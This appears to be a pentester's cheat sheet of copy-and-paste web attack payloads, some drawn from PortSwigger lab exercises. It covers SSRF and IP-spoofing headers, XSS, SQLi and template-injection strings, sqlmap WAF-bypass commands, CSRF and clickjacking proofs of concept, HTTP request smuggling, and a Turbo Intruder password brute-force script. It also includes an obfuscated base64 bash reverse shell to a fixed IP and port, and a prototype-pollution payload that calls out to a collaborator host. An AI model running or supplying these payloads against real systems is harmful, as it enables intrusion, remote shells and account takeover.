> should be able to copy and paste into single request to test for SSRF
```console
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

### XXS via XML FIle
```xml
<?xml version=”1.0" encoding=”UTF-8"?>
<xhtml:html xmlns:xhtml=”http://www.w3.org/1999/xhtml">
<xhtml:script>
alert(“XSS”);
</xhtml:script>
</xhtml: html>
```

### XXS via Angular Template Injection
```
{{constructor.constructor(‘alert(“XSS”)’)()}}
```

### CRLF XSS Injection
```
<script>%0d%0aalert(1)</script>
```

### Detect SQL Database Platform

> credits to @bughuntar

```sql
SELECT @@version                                           # MySQL/MSSQL
SELECT version()                                           # Postgresql
SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;  # Oracle
```

### Email Field Injection Payloads
```
# Cross-Site Scripting (XSS)
test+(<script>alert(1)</script>)@example.com
test@example(<script>alert(1)</script>).com
"<script>alert(1)</script>"@example.com

# Template Injection
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com

# SQLi
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com

# parameter pollution
victim&email=attacker@example.com
```

### Linux Pipe Filter Bypass
```bash
bash < <(base64 -d < <(echo YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjQ1LzQ0NDQgICAwPiYx))
# Example with space and pipe filter
bash${IFS}<${IFS}<(base64${IFS}-d${IFS}<${IFS}<(echo${IFS}YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjQ1LzQ0NDQgICAwPiYx))
```

### Signs of Java Serialization
- identification of base64 encoded string starting with `rO0` or hex encoded string starting with `ac ed 00`.
- with openbox test, look for the following:
  - `XMLdecoder`
  - `XStream.fromXML()`
  - `ObjectInputStream.readObject()`
  - `readObject`, `readObjectNoData`, `readResolve` or `readExternal`
  - `ObjectInputStream.readUnshared`
  - Any class that implements the `Serializable` interface.

### Burp Suite's XSRF PoC
- the `history.pushState`, from my understanding, is pretty much adding an entry to the history that points the vulnerable sites root (`/`) so that the victim wouldn't see an error or retry to submit the same request when pressing the back button!

```html
<html>
  <body>
    <form action="https://0aea002d03121c0d83d0d95c00890028.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="evil@normal-user.net" />
      <input type="hidden" name="csrf" value="jX98F5QoE4uS71nwAF5" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      <!-- this is clever -->
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Clickjacking PoC
```html
<style>
  iframe {
    position: relative;
    z-index: 2;
    width: 1280px;
    height: 800px;
    opacity: 0.1;
  }

  .first {
    position: absolute;
    top: 535px;
    left: 97px;
    z-index: 1;
  }

  .next {
    position: absolute;
    top: 334px;
    left: 252px;
    z-index: 1;
  }
</style>
<div class="first">
  Click me first
</div>
<div class="next">
  Click me next
</div>
<iframe src="https://0ae2003b0322f74f8008a85a00660013.web-security-academy.net/my-account"></iframe>
```

### Sqlmap Second-Order SQLi
```
sqlmap -u http://target-app.com --second-req http://target-app.com/user/profile --level=3 --risk=1
```

### Sqlmap Tampering Techniques ([source](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3))

- tell `sqlmap` to use tampering techniques for bypassing WAF that are database agnostic
- 
```
sqlmap -u http://target-app.com --level=3 --risk=1 \
	--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```

### Identifying HTTP Request Smuggling via Timeouts

- You might want to also try add a space or tab character before/after the `Transfer-Encoding` header to see if the front-end server doesn't process the header the same and maybe the front-end ignores the TE, forcing it to use the `Content-Length` header.

#### CL.TE
- The front-end server only forwards the 1 and A but not the X because of its using the `Content-Lenght` to determine the body of the request, but because the backend server is using the `Transfer-Encoding` header to determine the size of the request, it waits for the final chunk to arrive and termination (`0`), but it never does so it times out.
```
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

#### TE.CL
- The front-end server only forwards the 0, carriage return, and line feed, not the X, because it processes the request using chunked encoded - but backend server is expecting 6 characters in the message body, so it hangs and then it times out.
```
POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### Turbo Intruder Example with Multiple Inputs

#### HTTP Request
```
POST /login HTTP/2
Host: 0ad000b0035c89fa83fc8c5100dd0067.web-security-academy.net
Cookie: session=Wwc7Ls7omZps6lz1KyP6KpTGaxgRjkkH
Content-Length: 33
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: https://0ad000b0035c89fa83fc8c5100dd0067.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad000b0035c89fa83fc8c5100dd0067.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

username=%s&password=%s
```

#### Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           pipeline=False
                           )

    for passwd in open('./portswigger-labs/passwords.txt'):
        engine.queue(target.req, ['carlos', passwd.rstrip()])
        engine.queue(target.req, ['wiener', 'peter'])


@MatchRegex(r'.*my-account\?id=carlos\r\n')
def handleResponse(req, interesting):
        table.add(req)

```

### Potential Salesforce Auro Endpoints
```
/aura
/s/aura
/s/sfsites/aura
/sfsites/aura
/s/fact
```

### React Pentesting

- Look for user-supplied input passed to `href`, `src`, or `srcSet` attributes.
- Look for usage of `dangerouslySetInnerHTML` and user-supplied input.
- Look for direct DOM access via `findDOMNode` in conjunction with `.innerHTML` being set by user-supplied input.
- Look for prototype pollution opportunities which occur when user-supplied input that is parsed as an object is merged into another object.
  - Once a prototype pollution vector has been identified, look for references to undefined variables that may be referenced within the source code.

### Testing for HTTP Response Splitting

- Submit the following cURL request and see if the response contains the injected header.
```shell
curl -X GET "http://example.com/vulnerable-page" -H "Cookie: somecookie%0D%0AInjected-Header: Malicious-Content"
```

### Useful Headers for Web Cache Poisoning, Bypassing IP Restrictions, etc
|Header Name|Purpose|Usage|
|---|---|---|
|X-Forwarded-Server|Identify the receiving server in a chain of proxies|Useful for diagnostic and logging purposes, tracking which server handles the request.|
|X-Forwarded-Host|Preserve the original client's "Host" header|Essential for maintaining the intended host in virtual hosting and routing requests.|
|X-Forwarded-Scheme|Indicate the original scheme (HTTP or HTTPS) of the request|Ensures correct URL generation and handling of secure connections.|
|X-Host|Non-standard header; specific use case dependent|Usage would depend on the application or configuration employing this header.|
|X-Forwarded-IP|Specify the original client's IP address|Preserves the client's IP address for security, logging, and other purposes.|

### Node CLI Options RCE for Prototype Pollution
> https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem
```shell
node --import='data:application/javascript,console.log(1337)'
```

```json
"__proto__":{
   "NODE_OPTIONS": "--import=\"data:text/javascript,import dns from 'node:dns';dns.lookup('YOUR_COLLABORATOR_ID.oastify.com', x=>1)\""
}
```

### HTTP Header Injection via URL Path
```
/%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0a
```

### XSS Parenthesis Filter Bypass
```javascript
javascript:var {}={}; throw document.cookie
```
